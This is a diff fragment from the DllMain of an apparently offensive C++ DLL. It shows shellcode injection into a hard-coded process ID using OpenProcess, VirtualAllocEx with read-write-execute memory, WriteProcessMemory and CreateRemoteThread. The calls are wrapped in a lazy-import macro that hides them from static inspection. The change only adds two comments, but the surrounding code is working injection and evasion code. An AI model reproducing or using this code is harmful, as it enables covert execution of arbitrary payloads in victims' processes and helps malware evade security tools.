@@ -67,9 +67,9 @@ BOOL APIENTRY DllMain(HMODULE hModule,
         HANDLE remoteThread;
         PVOID remoteBuffer;
 
-        processHandle = LI_FN(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, DWORD(3420));
+        processHandle = LI_FN(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, DWORD(3420)); //Create proc handle
         remoteBuffer = LI_FN(VirtualAllocEx)(processHandle, nullptr, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-        LI_FN(WriteProcessMemory)(processHandle, remoteBuffer, shellcode, shellcodeSize, nullptr);
+        LI_FN(WriteProcessMemory)(processHandle, remoteBuffer, shellcode, shellcodeSize, nullptr); //Lazy function
         remoteThread = LI_FN(CreateRemoteThread)(processHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, 0, nullptr);
         CloseHandle(processHandle);
 
